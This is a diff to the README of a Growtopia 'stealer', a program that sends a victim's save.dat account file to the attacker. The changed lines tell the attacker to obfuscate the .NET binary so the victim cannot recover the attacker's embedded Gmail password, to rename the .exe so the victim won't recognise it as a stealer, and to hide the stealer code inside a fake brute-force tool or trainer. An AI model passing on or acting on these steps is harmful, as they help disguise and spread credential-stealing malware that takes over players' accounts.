@@ -37,4 +37,5 @@ A program that allows you to send you the victim's save.dat in Growtopia.
 
 ## Important
 * Use .net obfuscator so the victim won't be able to access your gmail and password
-* If you are going to send only the .exe file without combining the code with something else (like fake brute force, trainer etc.), then change the .exe file's name so the victim won't understand that this is a stealer.
+* Change the .exe file's name so the victim won't understand that this is a stealer.
+* If you are going to send the .exe file with combining the code with something else (like fake brute force, trainer etc.), then copy the code part in main in Program.cs and paste it in your code (It will only work if you wrote the code that you want to combine the stealer with in C#)
